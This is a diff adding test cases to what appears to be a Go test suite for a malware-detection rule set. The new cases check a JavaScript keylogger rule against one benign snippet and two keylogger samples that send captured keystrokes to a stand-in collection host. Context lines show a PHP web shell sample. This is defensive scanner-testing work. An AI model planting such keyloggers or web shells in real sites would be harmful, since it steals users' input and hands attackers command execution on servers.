@@ -188,6 +188,27 @@ if(! defined('WEBSHOT_ENABLED') ) define('WEBSHOT_ENABLED', false);
 function timthumb() {}
 system($_GET['cmd']);`,
 		},
+		{
+			name: "enter-key comparison near unrelated fetch",
+			rule: "exfil_keylogger_js",
+			sample: `onKeyDown:function(e){return t.handleKeydown(e)},"handleKeydown",` +
+				`(function(e){if((e.which||e.keyCode)===ct.KeyCode.RETURN)t.openLink(e)})),` +
+				`fetch("https://api.example.test/wp-json/wp/v2/media/"+t).then((function(e){return e.json()}))`,
+		},
+		{
+			name: "keystroke buffer accumulated and posted",
+			rule: "exfil_keylogger_js",
+			want: true,
+			sample: `var b="";document.addEventListener("keydown",function(e){b+=String.fromCharCode(e.keyCode);` +
+				`fetch("https://collect.example.test/c",{method:"POST",body:b})});`,
+		},
+		{
+			name: "keystroke serialized into request body",
+			rule: "exfil_keylogger_js",
+			want: true,
+			sample: `document.addEventListener('keypress',function(e){` +
+				`fetch('/assets/collect',{method:'POST',body:JSON.stringify({key:e.key,value:e.target.value})});});`,
+		},
 	}
 
 	for _, tc := range tests {
